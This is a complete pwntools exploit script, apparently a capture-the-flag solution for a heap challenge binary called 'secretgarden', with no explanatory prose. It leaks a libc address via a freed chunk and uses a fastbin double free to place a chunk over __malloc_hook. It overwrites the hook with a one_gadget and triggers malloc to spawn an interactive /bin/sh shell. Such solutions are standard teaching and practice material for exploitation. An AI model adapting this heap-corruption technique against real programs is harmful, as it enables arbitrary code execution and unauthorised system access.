from pwn import *
# context.log_level = "debug"
p = process("./secretgarden")
elf = ELF("./secretgarden")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.binary = "./secretgarden"

def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset

def cmd(choice):
	p.sendlineafter("choice : " , str(choice))

def add(size , color , name = None):
	cmd(1)
	p.sendlineafter("name :" , str(size))
	if name != None:
		p.sendafter("of flower :" , name)
	p.sendlineafter("flower :" , color)

def visit():
	cmd(2)
	return p.recvuntil("Baby Secret" , drop = True)

def remove(index):
	cmd(3)
	p.sendlineafter("remove from the garden:" , str(index))

def clean():
	cmd(4)

add(0x80 , "color" , "name") # 0 
add(0x80 , "color" , "name") # 1
remove(0)
add(0 , "color") # 2

main_arena = u64(visit().split("flower[2] :")[1][:6].ljust(8 , "\x00"))
libc_base = main_arena - offset_bin_main_arena(0) - 0x3c4b20
malloc_hook = libc_base + 0x3c4b10
print(hex(malloc_hook))
# gdb.attach(p)
add(0x60 , "color" , "name") # 3
add(0x60 , "color" , "name") # 4

remove(3)
remove(4)
remove(3)

fake_addr = malloc_hook - 0x23
one_gadget = libc_base + 0xf1147 # 0x4526a
"""
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
add(0x60 , "color" , p64(fake_addr))
add(0x60 , "color" , "name")
add(0x60 , "color" , "name")
add(0x60 , "color" , "a" * 0x13 + p64(one_gadget))

cmd(1)

p.interactive()


